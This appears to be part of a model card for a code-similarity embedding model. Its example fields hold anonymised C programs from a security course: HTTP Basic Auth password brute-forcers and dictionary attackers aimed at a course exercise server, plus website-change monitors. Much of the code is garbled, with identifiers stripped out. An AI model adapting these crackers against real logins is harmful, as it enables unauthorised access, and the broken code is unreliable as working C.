+  - "#include<stdio.h>\n#include<stdlib.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include <sys/time.h>\n\nint ()\n\
+    {\n  FILE *fh,*fp,*fp1,*d;\n  char\n  [10000],PassString[50],p[10000],temp1[10000],filename[50],f1,f2,temp2[100];\n  sleep(60*60*24);\n\
+    \  system(\"wget http://www.cs.rmit.edu./students\");\n  if(system==0)\n  {\n   printf(\"File stored\");\n  }\n  strcpy(filename,\"\
+    index.html\"); \n  if((fh=fopen(filename,\"r\"))==NULL)\n  {\n   printf(\"cannot open file\\n\");\n   exit(1);\n  }\n\
+    \  fp=fopen(\"index.txt\",\"r\");\n  fp1=fopen(\"index1.txt\",\"r\");\n \n  while((fgets(PassString,sizeof(PassString),fh))!=\
+    \ NULL)\n  {\n    fread(p,sizeof(PassString),sizeof(PassString),fh);\n    printf(\" contents %s\\n\",p);\n    while((f1!=EOF)\
+    \ || (f2!=EOF))\n    {\n     f1=getc(fp);\n     f2=getc(fp1);\n     if(f1<f2)\n     {\n     strcpy(,p);\n     fp=fopen(\"\
+    index.txt\",\"r+b\");\n     fputs(,fp);\n     fflush(fp); \n     fclose(fp); \n    }\n    else\n    {\n      strcpy(temp1,p);\n\
+    \      fp1=fopen(\"index1.txt\",\"r+b\");\n      fputs(temp1,fp1);\n      fflush(fp1);\n      fclose(fp1);\n    }\n  \
+    \  }\n    if(system(\"diff -b -w index.txt index1.txt > Diff.txt\")==0)\n    {\n      d=fopen(\"Diff.txt\",\"r\");\n \
+    \     if((fgets(,sizeof(),d))!=NULL)\n      {\n        printf(\"The difference between  exist\");\n\tsystem(\"Mail \\\
+    r\\n Difference\");\n      }\n      \n    }\n  }\n return 0;\n  }\n"
+- source_sentence: "#include<stdio.h>\n#include<strings.h>\n#include<stdlib.h>\n#include<ctype.h>\n\n#define MAX_SIZE 255\n\
+    \n\nint CrackPasswd(FILE *fp)\n{\n   int i, cnt, flag;\n   char string1[MAX_SIZE],string2[MAX_SIZE],[MAX_SIZE], passwd[MAX_SIZE];\n\
+    \   char fin;\n   \n   strcpy(string1,\"wget http://sec-crack.cs.rmit.edu./SEC/2/\");\n   strcpy(string2,\" --http-user=\
+    \ --http-passwd='\");\n   strcpy(,\"\");\n\n   while ((fin = fgetc(fp)) != EOF)\n   {\n      cnt = 0;\n      \n      for\
+    \ (i=0;i<MAX_SIZE;i++)\n      {   \n         passwd[i] = '\\0';\n         [i] = '\\0';\n      }\n\t \n      while(fin\
+    \ != '\\n')\n      {\n\t passwd[cnt] = fin;\n\t cnt++;\n\t fin = fgetc(fp);\n      } \n         \n      if(strlen(passwd)\
+    \ <= 3)\n      {\n         strcat(, string1);\n         strcat(, string2);\n\t strcat(, passwd);\n\t strcat(, \"'\");\n\
+    \t printf(\"Sending Request as %s\\n\",);\n\t flag = system();\n\t  \n         if (flag == 0)\n\t {\n            printf(\"\
+    \\nPassword is %s\\n\",passwd);\n\t    return 1;\n\t }\n         \n\t strcpy(,\"\"); \n         strcpy(passwd,\"\");\n\
+    \       }\n    }\n}  \n\n\nint  (int argc, char *argv[])\n{\n   char *fname;\n   FILE *fp;\n   \n   int , end;    \n \
+    \  \n    = time();\n    \n   if (argc != 2)\n   {\n      fprintf(stdout,\"Usage : ./Dictionary <dictionary>\\n\");\n \
+    \     return(EXIT_FAILURE);\n   }\n   \n   fname = argv[1];\n   \n   if((fp = fopen(fname, \"r\")) == NULL)\n   {\n  \
+    \    fprintf(stderr,\"Error : Failed  open %s for . \\n\",fname);\n      return(EXIT_FAILURE);\n   }\n   \n   CrackPasswd(fp);\n\
+    \  \n   end = time(); \n   printf(\"Time Required = %lld msec\\n\",(end-)/());\n   return (EXIT_SUCCESS);\n  \n}\n   \
+    \  \n\t   \n\t  \t\n"
+  sentences:
+  - "#include <stdio.h>\n#include <stdlib.h>\n#include <sys/time.h>\n#include <strings.h>\n#include <ctype.h>\n\nint ()\n\
+    {\n  FILE *fp; \n  char *chk,[4];\n  int i=1;\n  while (i == 1) \n  {\n  \n  system(\"wget -p --convert-links http://www.cs.rmit.edu./students/\"\
+    );\n\n  system(\"mkdir first\"); \n  system(\"mkdir second\"); \n\n  \n  system(\"mv www.cs.rmit.edu./images/*.*  first/\"\
+    );\n  system(\"mv www.cs.rmit.edu./students/*.* first/\");\n\n  sleep(86400); \n\n  \n  system(\"wget -p --convert-links\
+    \ http://www.cs.rmit.edu./students/\");\n\n  \n  system(\"mv www.cs.rmit.edu./images/*.* second/\");\n  system(\"mv www.cs.rmit.edu./students/*.*\
+    \ second/\");\n\n  \n  \n  system(\"diff first second > imagesdifference.txt\");\n\n  \n  fp = fopen(\"imagesdifference.txt\"\
+    ,\"r\");\n  \n  chk = fgets(, 4, fp);\n  \n  if (strlen() != 0)\n     system(\"mailx -s  \\\"Difference from WatchDog\\\
+    \"  < imagesdifference.txt\");\n  }\n  return 0;\n}\n"
+  - "\n\n\n \n\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/stat.h>\n#include <unistd.h>\n#include <sys/wait.h>\n\
+    #include <signal.h>\n#include <sys/signal.h>\t\t\t  \n\n\n#define USERNAME \"\"\n#define URL \"sec-crack.cs.rmit.edu./SEC/2\"\
+    \n#define TEST_URL \"yallara.cs.rmit.edu./~/secure\"\n#define MAX_PASSWD_LEN 3\n#define MAX_CHAR_SET 52\n#define NUM_OF_PROCESSES\
+    \ 4\n\n#define TRUE 1\n#define FALSE 0\n\n\n\n\n\n\n\n\n\n\ntypedef int (*CrackFuncPtr)(const char*, const char*, int);\n\
+    \n\nint pwdFound;\nint cDie;\n\n\nint runBruteForce(const char chSet[], int numOfCh, int len, CrackFuncPtr func\n\t\t\t\
+    \t\t\t, int sCh, int eCh, int id);\nchar* initPasswdStr(int len, char ch, char headOfChSet);\nint getChPos(const char\
+    \ chSet[], int numOfCh, char ch);\nint pow(int x, int y);\nint crackHTTPAuth(const char *username, const char *passwd,\
+    \ int id);\nint myFork(const char chSet[], int numOfCh, int len, CrackFuncPtr func\n\t\t\t\t, int sCh, int eCh);\n\n\n\
+    \n\n\nvoid passwdFoundHandler(int signum)\n{\n\tpwdFound = TRUE;\n}\n\n\n\nvoid childFinishHandler(int signum)\n{\n\t\
+    cDie++;\t\n}\n\n\n\n\n\nint main()\n{\n\tchar charSet[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', \n \
+    \                    'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', \n\t\t\t\t\t 'W', 'X', 'Y', 'Z',\t\n\t\t\t\
+    \t\t 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',\t\n\t\t\t\t\t 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',\
+    \ 'u', 'v', \n\t\t\t\t\t 'w', 'x', 'y', 'z'};\n\t\n\n\tint i;\t\n\tint pid[NUM_OF_PROCESSES];\n\n\tpwdFound = FALSE;\n\
+    \tcDie = 0;\n\t\n\tfor (i=0; i<NUM_OF_PROCESSES; i++)\n\t{\n\t\tpid[i] = myFork(charSet, MAX_CHAR_SET, MAX_PASSWD_LEN,\
+    \ crackHTTPAuth, \n\t\t\t\t\t\t(((MAX_CHAR_SET /NUM_OF_PROCESSES)*i)+1)-1, \n\t\t\t\t\t\t(MAX_CHAR_SET /NUM_OF_PROCESSES)*(i+1)-1);\n\
+    \t}\n\n\t\n\tfor (;;)\n\t{\n\t\tsignal(SIGUSR1, passwdFoundHandler);\n\t\tsignal(SIGUSR2, childFinishHandler);\n\n\t\t\
+    \n\t\tif (pwdFound)\n\t\t{\n\t\t\tfor (i=0; i<4; i++)\n\t\t\t{\n\t\t\t\tkill((int)pid[i], SIGKILL);\n\t\t\t}\n\t\t\texit(EXIT_SUCCESS);\n\
+    \t\t}\n\n\t\t\n\t\tif (cDie >= NUM_OF_PROCESSES)\n\t\t{\n\t\t\texit(EXIT_SUCCESS);\n\t\t}\n\n\t}\n\treturn EXIT_SUCCESS;\n\
+    }\n\n\n\nint myFork(const char chSet[], int numOfCh, int len, CrackFuncPtr func,\n\t\t\t\tint sCh, int eCh)\n{\n\tint\
+    \ i;\n\t\n\tint pid = fork();\n\n\tif (pid == 0)\n\t{\n\t\tfor (i=1; i<=len; i++)\n\t\t{\n\t\t\tif (runBruteForce(chSet,\
+    \ numOfCh, i, func, sCh, eCh, getpid()))\n\t\t\t{\t\n\t\t\t\t\n \t\t\t\tif (!kill(getppid(), SIGUSR1))\n\t\t\t\t{\n\t\t\
+    \t\t\tprintf(\"Process %d found the password and notified the parent process already\", \n\t\t\t\t\t\t\t\t\t(int)getpid());\n\
+    \t\t\t\t}\n\n\t\t\t\texit(EXIT_SUCCESS);\n\t\t\t}\n\t\t}\n\n\t\t\n\t\tif (!kill(getppid(), SIGUSR2))\n\t\t{\n\t\t\tprintf(\"\
+    Process %d could not found the password and notified the parent process already\", \n\t\t\t\t\t\t\t\t\t(int)getpid());\n\
+    \t\t}\n\t\t\n\t\texit(EXIT_SUCCESS);\n\t}\n\telse if (pid > 0)\n\t{\n\t\treturn pid;\n\t}\n\telse\n\t{\n\t\tprintf(\"\
+    error\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n}\n\n\n\nint runBruteForce(const char chSet[], int numOfCh, int len, CrackFuncPtr\
+    \ func\n\t\t\t\t\t\t, int sCh, int eCh, int id)\n{\n\tint iter; \n\tint chIter; \n\tint curPos = 0; \n\t\n\tchar *str;\n\
+    \t\n\tint passwdFound = FALSE;\n\t\n\tstr = initPasswdStr(len, chSet[sCh], chSet[0]);\n\n\tprintf(\"\\nNow trying %d character(s)\\\
+    n\", len);\n\n\tfor (iter=0; (iter<pow(numOfCh, (len-1))*(eCh-sCh+1))&&(!passwdFound); iter++)\n\t{\n\t\tfor (chIter=len-1;\
+    \ chIter>=0; chIter--)\n\t\t{\n\t\t\tif (iter % pow(numOfCh, chIter) == 0) \n\t\t\t{\n\t\t\t\tcurPos = getChPos(chSet,\
+    \ numOfCh, str[chIter]);\n\t\t\t\tstr[chIter] = chSet[curPos+1];\n\t\t\t}\n\n\t\t\tif (iter % pow(numOfCh, (chIter+1))\
+    \ == 0) \n\t\t\t{\n\t\t\t\tif (chIter == len-1)\n\t\t\t\t{\n\t\t\t\t\tstr[chIter] = chSet[sCh];\n\t\t\t\t}\n\t\t\t\telse\n\
+    \t\t\t\t{\n\t\t\t\t\tstr[chIter] = chSet[0];\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tif (func(USERNAME, str, id))\n\t\t{\n\t\
+    \t\tprintf(\"\\nPassword found: %s\\n\\n\", str);\n\t\t\tpasswdFound = TRUE;\n\t\t}\t\t\t\n\t}\n\n\t(str);\n\tstr = NULL;\n\
+    \t\n\treturn passwdFound;\n}\n\n\n\nint getChPos(const char chSet[], int numOfCh, char ch)\n{\n\tint i;\n\t\n\tfor (i=0;\
+    \ i<numOfCh; i++)\n\t{\n\t\tif (chSet[i] == ch)\n\t\t{\n\t\t\treturn i;\n\t\t}\n\t}\n\n\treturn -1;\n\t\n}\n\n\n\nchar*\
+    \ initPasswdStr(int len, char ch, char headOfChSet)\n{\n\tint i;\n\n\tchar *str;\n\n\tstr = malloc(len);\n\n\tif (str)\n\
+    \t{\n\t\tfor (i=0; i<len-1; i++)\n\t\t{\n\t\t\tstr[i] = headOfChSet;\n\t\t}\n\t\tstr[len-1] = ch;\n\t\tstr[len] = '\\\
+    0';\n\t}\n\telse\n\t{\n\t\tfprintf(stderr, \"\\nError: Unable  allocate %d bytes memory.\", len);\n\t\texit(EXIT_FAILURE);\n\
+    \t}\n\t\n\treturn str;\n}\n\n\n\nint pow(int x, int y)\n{\n\tint ans = 1, i;\n\t\n\tfor (i=0; i<y; i++)\n\t{\n\t\tans\
+    \ *= x;\n\t}\n\n\treturn ans;\n}\n\n\n\nint crackHTTPAuth(const char *username, const char *passwd, int id)\n{\n\tchar\
+    \ cmd[256];\n\tstruct stat fileInfo;\n\tchar fileToCheck[256];\n\t\n\tsprintf(cmd, \"wget -O %d -q --http-user=%s --http-passwd=%s\
+    \ --proxy=off %s\", \n\t\t\t\t\t\tid, username, passwd, URL);\n\n\tsystem(cmd);\t\n\n\tsprintf(fileToCheck, \"%d\", id);\n\
+    \n\t(void)stat(fileToCheck, &fileInfo); \n\treturn fileInfo.st_size;\n\t\n}\n\n\n"
+  - "#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\n#include<strings.h>\n#include <ctype.h>\n#include <math.h>\n\
+    #include <sys/time.h>\n\nint\n()\n{\n\n\tint        , end;\n\tFILE           *fp;\n\tint             i, j;\n\tchar   \
+    \         input;\n\tchar            password[30];\n\tint             check;\n\n\tfloat           total_time;\n\tint  \
+    \           number;\n\t = time();\n\n\n\tif ((fp = fopen(\"words\", \"r\")) == NULL) {\n\t\tfprintf(stderr, \"Error :\
+    \ Failed  open words for .\\n\");\n\t\treturn (EXIT_FAILURE);\n\t}\n\twhile ((input = fgetc(fp)) != EOF) {\n\t\tj = 0;\n\
+    \t\tfor (i = 0; i < 30; i++)\n\t\t\tpassword[i] = '\\0';\n\n\t\twhile(input != '\\n' ) {\n\n\t\t\tpassword[j] = input;\n\
+    \t\t\tj++;\n\t\t\tinput = fgetc(fp);\n\t\t\t\n\t\t\n\t\t}\n\n\n\t\tif (strlen(password) <= 3) {\n\t\t\tprintf(\"%s\\t\"\
+    ,password);\n\t\t\tfflush(stdout);\n\t\t\tcheck = SysCall(password);\n\t\t\tif (check == 0) {\n\t\t\t\tgetpid();\n\t\t\
+    \t\tend = time();\n\t\t\t\ttotal_time = (end - ) / 1e9;\n\t\t\t\tprintf(\"\\ntotal time_var = %f \", total_time);\n\t\t\
+    \t\tprintf(\"\\n\\nAvg getpid() time_var = %f usec\\n\", total_time);\n\t\t\t\tprintf(\"\\navg time_var  %f / %d = %f\\\
+    n\", total_time, number, total_time / number);\n\t\t\t\texit(0);\n\t\t\t}\n\t\t}\n\n\t}\n\n\treturn (EXIT_SUCCESS);\n\
+    }\nint\nSysCall(char *password)\n{\n\tchar            url1[255], url2[255], [255];\n\tint             rettype;\n\trettype\
+    \ = 0;\n\tstrcpy(url1, \"wget --non-verbose --http-user= --http-passwd=\");\n\tstrcpy(url2, \" http://sec-crack.cs.rmit.edu./SEC/2/index.php\"\
+    );\n\n\tstrcat(, url1);\n\tstrcat(, password);\n\tstrcat(, url2);\n\n\trettype = system();\n\t\n\tif (rettype == 0) {\n\
+    \t\tprintf(\"Successfully retrieved password: %s\\n\", password);\n\t\treturn 0;\n\t}\n\tstrcpy(, \"\");\n}\n"
+- source_sentence: "\n\n\n#include <stdio.h>\n\n#include <stdlib.h>\nint ()\n{\n  int i,j,k,counter =0;\n  char  word[3];\n\
+    \  char paswd[3];\t\n  char get[100];\n  int ;\n  char username[]=\"\";\n  \n  \n  \n  \n  \n\t\t\t\t\n\t\n\tfor (i =\
+    \ 65; i <= 122; i++)\n\t{\n\t\t if(i==91) {i=97;} \n   \n\t\tfor (j = 65; j <= 122; j++)\n\t\t{\n\t\t\n\t\tif(j==91) {j=97;}\n\
+    \      \n\t\tfor (k = 65; k <= 122; k++)\n\t\t{\n\t\t \n\t\t\tif(k==91) {k=97;}  \n\t\t\t\n\t\t\t word[0] = i;\n\t\t\t\
+    \ word[1] = j;\n\t\t\t word[2] = k;\n\t\t\t sprintf(paswd,\"%c%c%c\",word[0],word[1],word[2]);       \n\t\t\t counter++;\n\
+    \t\t\tprintf(\"%d )%s\\n\\n\", counter, paswd);\n\t\t\t sprintf(get,\"wget --http-user=%s --http-passwd=%s http://sec-crack.cs.rmit.edu./SEC/2/\"\
+    ,username,paswd);\n\t\t\t=system(get);\n\t  \n\t\t\tif(==0) \n\t\t\t{\n\t\t\tprintf(\"The Password has been cracked and\
+    \ it is : %s\" , paswd);\n\t\t\texit(0);\n\t\t\t}\n\t\t}\n     \n\t\t}\n  \n\t}\n  \n\t\n}\n\n"
+  sentences:
+  - "\n\n#include <stdio.h>\n#include <string.h>\n#include <sys/time.h>\n\n#define OneBillion 1e9\n#define false 0\n#define\
+    \ true 1\nint execPassword(char *, char *b) {\n\n\n    char [100]={'\\0'};\n    strcpy(,b);\n    \n    strcat(,);\n  \
+    \  printf (\"Sending command %s\\n\",);\n    if ( system()== 0) {\n       printf (\"\\n password is : %s\",);\n      \
+    \ return 1;\n    }\n    return 0;\n}\n \n\nint bruteForce(char [],char comb[],char *url) {\n\n\nint i,j,k;\n\n   for(i=0;i<52\
+    \ ;i++) {\n        comb[0]= [i];\n        if (execPassword(comb,url)== 1) return 1; \n          for(j=0;j<52;j++) {\n\
+    \              comb[1] = [j];\n              if(execPassword(comb,url)==1) return 1;\n                for(k=0;k<52;k++)\
+    \ {\n                    comb[2] = [k];\n                    if(execPassword(comb,url)==1) return 1;\n               \
+    \ }\n          comb[1] = '\\0';\n     }\n   }\n   return 0;\n\n} \n\nint  (char *argc, char *argv[]) {\n\n int i,j,k;\n\
+    \ char strin[80] = {'\\0'};\n char *passwd;\n char a[] = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};\n\
+    \ char v[4]={'\\0'};\n int startTime, stopTime, final;\n int flag=false; \n strcpy(strin,\"wget http://sec-crack.cs.rmit.edu./SEC/2/\
+    \ --http-user= --http-passwd=\");\n\n  startTime = time();\n    if (bruteForce(a,v,strin)==1) {\n      stopTime = time();\n\
+    \      final = stopTime-startTime;\n    }\n\n       printf (\"\\n The password is : %s\",v);\n       printf(\"%lld nanoseconds\
+    \ (%lf) seconds \\n\", final,  (double)final/OneBillion );\n\n}\n"
+  - "\n\n#include<stdio.h>\n#include<strings.h>\n#include<stdlib.h>\n#include<ctype.h>\n#define MAX_SIZE 255\n\n\nint  (int\
+    \ argc, char *argv[])\n {\n     FILE *fp;\n     \n   while(1)\n    {       \n      system(\"wget -p http://www.cs.rmit.edu./students\"\
+    );\n\n\n\n      system(\"mkdir data\"); \n      if((fp=fopen(\"./data/index.html\",\"r\"))==NULL)\n       { \n       \
+    \  system(\"cp www.cs.rmit.edu./students/index.html ./data\");\n\t \n       }\n      else\n       {  \n              \
+    \ \n\t \n\t system(\"diff ./data/index.html www.cs.rmit.edu./students/index.html | mail @cs.rmit.edu.\");\n\t system(\"\
+    cp www.cs.rmit.edu./students/index.html ./data\");\n       }     \n\n\n\n      system(\"mkdir images\"); \n      if((fp=fopen(\"\
+    ./images/file.txt\",\"r\"))==NULL)\n       { \n          system(\"md5sum www.cs.rmit.edu./images/*.* > ./images/file.txt\"\
+    );\n\t\t \n       }\n      \n      else\n       {          \n          system(\"md5sum www.cs.rmit.edu./images/*.* > www.cs.rmit.edu./file.txt\"\
+    );\n\t \n\t \n\t \n\t system(\"diff ./images/file.txt www.cs.rmit.edu./file.txt | mail @cs.rmit.edu.\");\n\t system(\"\
+    cp www.cs.rmit.edu./file.txt ./images\");\n       }\n     sleep(86400); \n    }\t\n     return (EXIT_SUCCESS);\n  }\n\
+    \     \n\t   \n\t  \t\n"
+  - "#include<stdio.h>\n#include<string.h>\n#include<strings.h>\n#include<stdlib.h>\n#include<sys/time.h>\n\n\npublic static\
+    \ void main()\n{\n\tint i;\n\tchar ar[100];\n\tFILE* f;\n\tFILE* ;\n\tsystem(\"wget -O first www.rmit.edu./students\"\
+    );  \n\twhile(1)\n\t{\n\t\tsleep(86400);\t\n\t\tsystem(\"rm -f thed\");\n\t\tsystem(\"rm -f new\");\n\t\tsystem(\"wget\
+    \ -O new www.cs.rmit.edu./students\");\t\n\t\tsystem(\"diff new first >thed\");\t\n\t\tf=fopen(\"thed\",\"r\");\n\t\t\
+    if(fgets(ar,100,f)!=NULL)\n\t\t{\t\t\n\t\t\t printf(\"\\n\\n The  has CHANGEDS\");\t\t\n\t\t\tsystem(\"mail @cs.rmit.edu.\
+    \ <thed\"); \n\t\t\tsystem(\"cp new first\");\n\t\t\tfclose(f);\n\t\t}\n\t\telse\n\t\t{\n\t\tfclose(f);\n\t\tprintf(\"\
+    \\n\\nthe  has not changed \");\n\t\t}\n\t}\n\n}\n\n\t\n\t\n\t\n\t\t\n\n\n"
+model-index: null
+config:
+  architectures:
+  - RobertaModel
+  model_type: roberta
+  tokenizer_config:
+    bos_token: <s>
+    cls_token: <s>
+    eos_token: </s>
+    mask_token: <mask>
+    pad_token: <pad>
+    sep_token: </s>
+    unk_token: <unk>
+cardData:
+  tags:
+  - sentence-transformers
+  - sentence-similarity
+  - feature-extraction
+  - dense
+  - generated_from_trainer
+  - dataset_size:3081
+  - loss:BatchAllTripletLoss
+  base_model: microsoft/codebert-base
+  widget:
+  - source_sentence: "#include <sys/times.h>\n#include <strings.h>\n#include <string.h>\n#include <ctype.h>\n\n#include <stdio.h>\n\
+      #include <stdlib.h>\n#include <sys/times.h>\n#include <strings.h>\n#include <string.h>\n#include <ctype.h>\n#include\
+      \ <sys/time.h>\n#define ant 1e9\n\nint ()\n{\nchar c[2],[3][2];\nregister int i,j,k,x,y,z,t,r,s,final,count=0;\nint\
+      \ starttime,endtime,totaltime; \nchar ch[5],ch1[5],ch2[5],s1[100],s2[100];\nc[0]='A',c[1]='a';\n[0][1]=[1][1]=[2][1]='\\\
+      0';\n\nstrcpy(s1, \"wget --http-user= --http-passwd=\");\n    strcpy(s2, \" http://sec-crack.cs.rmit.edu./SEC/2/\");\n\
+      \nstarttime=time();\n\nfor(r=0;r<=1;r++)\n{\n\t\n\tfor(i=c[r],x=0;x<=25;x++,i++)\n\t{\n\t\t\n\t\t [0][0]=i;\n\t\t strcpy(ch,[0]);\n\
+      \n\n\t\tfor(s=0;s<=1;s++)\n\t\t{\n\t\t\tfor(j=c[s],z=0;z<=25;z++,j++)\n\t\t\t{\t\n\t\t\n\t\t\t\t[1][0]=j;\n\t\t\t\t\
+      strcpy(ch1,[0]);\n\t\t\t\tstrcat(ch1,[1]);\n\n\t\t\t\tfor(t=0;t<=1;t++)\n\t\t\t\t{\n\t\t\t\t\tfor(k=c[t],y=0;y<=25;y++,k++)\n\
+      \t\t\t\t\t{\tcount++;\n\t\t\t\t\t\t[2][0]=k;\n\t\t\t\t\t\tstrcpy(ch2,ch1);\n\t\t\t\t\t\tstrcat(ch2,[2]);\n\t\t\t\t\t\
+      \tprintf(\"\\n  %s\",ch2);\n\n\n\n         strcat(s1, ch2);\n          strcat(s1, s2);\n\t  printf(\"\\n combination\
+      \ sent %s\\n\", s1);\n          final = system(s1);\n          if (final == 0)\n          {\n            endtime=time();\n\
+      \t\ttotaltime=(endtime-starttime);\n\t\t printf(\"count %d\",count);\n\t    printf(\"totaltime %1f\",(double)totaltime/ant);\n\
+      \t    printf(\"\\nsuccess %s\\n\",ch2);\n            exit(1);\n          }\n\n\n\t  strcpy(s1, \"\");\n\t  strcpy(s1,\
+      \ \"wget --http-user= --http-passwd=\");\n\n\n\t\t\t\t}\n\n\t\t\t\t}\n\t\t\t}\n\n\t\t}\n\t   }\n}\n\n}\n\n\n\n"
+    sentences:
+    - "\n\n\n\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n#include <time.h>\n#include <netdb.h>\n#include\
+      \ <unistd.h>\n#include <netinet/in.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <sys/time.h>\n#include\
+      \ <arpa/inet.h>\n#include <errno.h>\n#include <signal.h>\n\n#define BUFFER_SIZE 2000\n#define RETURN_OK 0\n#define RETURN_ERROR\
+      \ 1\n#define TRUE  1\n#define FALSE 0\n#define PASSWORD_LENGTH 3\n\n#define STATUS_OK            200\n#define STATUS_AUTH_REQUIRED\
+      \ 401\n#define CONN_CLOSED          2\n\n\nchar *host;\nchar *filename;\nint  ;\nchar *url;\nchar *username;\nint attempt;\n\
+      struct sockaddr_in serverAddr;\n\n\nvoid processArguments(int, char **argv, char **, char **);\nvoid printUsage(char\
+      \ *);\nvoid splitURL(const char *, char **, char **);\nint openConnection();\nvoid initialiseConnection();\nvoid sendRequest(int,\
+      \ char *, char *, char *, char *);\nint getResponseStatus(int);\nvoid base64_encode(const unsigned char *, unsigned\
+      \ char *);\nvoid getHostErrorMsg(char *);\nvoid generatePassword(char *, int);\nvoid testPassword(char *);\n\n\n\n\n\
+      int main(int argc, char *argv[])\n{\n    char password[PASSWORD_LENGTH+1];\n    int i;\n\n    \n\n    attempt = 0;\n\
+      \    processArguments(argc, argv, &url, &username);\n    splitURL(url, &host, &filename);\n\n    initialiseConnection();\n\
+      \     = openConnection();\n\n    \n\n    for (i=1; i<=PASSWORD_LENGTH; i++)\n    {\n        memset(password, 0, PASSWORD_LENGTH+1);\n\
+      \        generatePassword(password, i);\n    }\n\n    printf(\"The password has not been cracked\\n\");\n    exit(RETURN_OK);\n\
+      \n}\n\n\n\n\nvoid generatePassword(char *password, int reqLength)\n{\n    static const char *chars = \n      \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"\
+      ;\n\n    int currLength;\n    int i;\n\n    currLength = strlen(password);\n    currLength++;\n\n    for (i=0; i<strlen(chars);\
+      \ i++)\n    {\n        password[currLength-1] = chars[i];\n\n        if (strlen(password) != reqLength)\n        {\n\
+      \           \n           generatePassword(password, reqLength);\n        }\n        else\n        {\n           testPassword(password);\n\
+      \        }\n\n        password[currLength] = '\\0';\n    }\n}\n\n\n\n\nvoid testPassword(char *password)\n{\n    int\
+      \ status;\n\n    attempt++;\n\n    \nTestPassword:\n    sendRequest(, host, filename, username, password);\n    status\
+      \ = getResponseStatus();\n\n    if (status == STATUS_OK)\n    {\n        printf(\"The password has been found after\
+      \ %d attempts: %s\\n\",\n               attempt, password);\n        exit(RETURN_OK);\n    }\n    else if (status ==\
+      \ CONN_CLOSED)\n    {\n        \n        ();\n         = openConnection();\n        goto TestPassword;        \n   \
+      \ }\n    else if (status != STATUS_AUTH_REQUIRED)\n    {\n        printf(\"Status %d received from server\\n\", status);\n\
+      \        exit(RETURN_ERROR);\n    }\n\n}\n\n\n\n\nvoid processArguments(int argc, char *argv[], char **url, char **username)\n\
+      {\n    if (argc != 3)\n    {\n        printUsage(argv[0]);\n        exit(1);\n    }\n\n    *url = (char *) malloc(strlen(argv[1]\
+      \ + 1));\n    strcpy(*url, argv[1]);\n\n    *username = (char *) malloc(strlen(argv[2] + 1));\n    strcpy(*username,\
+      \ argv[2]);\n\n}\n\n\n\n\n\nvoid printUsage(char *program)\n{\n    fprintf(stderr, \"Usage:\\n\");\n    fprintf(stderr,\
+      \ \"%s url username\\n\", program);\n}\n\n\n\n\nvoid splitURL(const char *url, char **host, char **file)\n{\n    char\
+      \ *p1; \n    char *p2;\n\n    \n    p1 = strstr(url, \"//\");\n    if (p1 == NULL)\n        p1 = (char *) url;\n   \
+      \ else\n        p1 = p1 + 2;\n\n    \n    p2 = strstr(p1, \"/\");\n    if (p2 == NULL)\n    {\n        fprintf(stderr,\
+      \ \"Invalid url\\n\");\n        exit(RETURN_ERROR);\n    }\n\n    *host = (char *) malloc(p2-p1+2);\n    strncpy(*host,\
+      \ p1, p2-p1);\n    (*host)[p2-p1] = '\\0';\n\n    *file = (char *) malloc(strlen(p2+1));\n    strcpy(*file, p2);\n\n\
+      }\n\n\n\n\nvoid sendRequest(int , char *host, char *filename, char *username, \n                 char *password)\n{\n\
+      \    char message[BUFFER_SIZE];\n    unsigned char encoded[BUFFER_SIZE];\n    unsigned char token[BUFFER_SIZE];\n\n\
+      \    \n\n    \n    sprintf((char *) token, \"%s:%s\", username, password);\n    base64_encode(token, encoded);\n\n \
+      \   sprintf(message, \"GET %s HTTP/1.1\\nHost: %s\\nAuthorization:  %s\\n\\n\",\n            filename, host, encoded);\n\
+      \n    if (write(, message, strlen(message)) == -1)\n    {\n        perror(\"\");\n        exit(RETURN_ERROR);\n    }\n\
+      }\n\n\n\n\nint getResponseStatus()\n{\n    char message[BUFFER_SIZE];\n    int  bytesRead;\n    char *p1;\n    char\
+      \ status_str[4];\n    int  status;\n\n    \n\n    while (TRUE)\n    {\n        bytesRead = (, message, BUFFER_SIZE-1);\n\
+      \        if (bytesRead == -1)\n        {\n            perror(\"\");\n            exit(RETURN_ERROR);\n        }\n  \
+      \      else if (bytesRead == 0)\n        {\n            \n            return CONN_CLOSED;\n        }\n\n        message[bytesRead+1]\
+      \ = '\\0';\n\n        \n        p1 = strstr(message, \"HTTP\");\n        if (p1 != NULL)\n        {\n            p1\
+      \ = p1 + 9;\n            break;\n        }\n    }\n\n    strncpy(status_str, p1, 3);\n    status_str[3] = '\\0';\n \
+      \   status = atol(status_str);\n\n    return status;\n}\n\n\n\n\nint openConnection()\n{\n    int ;\n\n    if (( = socket(AF_INET,\
+      \ SOCK_STREAM, 0)) == -1)\n    {\n        perror(\"\");\n        exit(RETURN_ERROR);\n    }\n\n    if (connect(, (struct\
+      \ sockaddr *) &serverAddr, sizeof(serverAddr)) == -1)\n    {\n        perror(\"connect\");\n        exit(RETURN_ERROR);\n\
+      \    }\n\n    return ;\n}\n\n\n\n\nvoid initialiseConnection()\n{\n    struct hostent *serverHostent;\n    unsigned\
+      \  serverIP;\n    char errorMsg[BUFFER_SIZE]; \n\n\n    \n\n    memset(&serverAddr, 0, sizeof(serverAddr));\n    serverAddr.sin_port\
+      \ = htons(80);\n\n\n    if ((serverIP = inet_addr(host)) != -1)\n    {\n        serverAddr.sin_family = AF_INET;\n \
+      \       serverAddr.sin_addr.s_addr = serverIP;\n    }\n    else if ((serverHostent = gethostbyname(host)) != NULL)\n\
+      \    {\n\tserverAddr.sin_family = serverHostent->h_addrtype;\n        memcpy((void *) &serverAddr.sin_addr,\n\t\t (void\
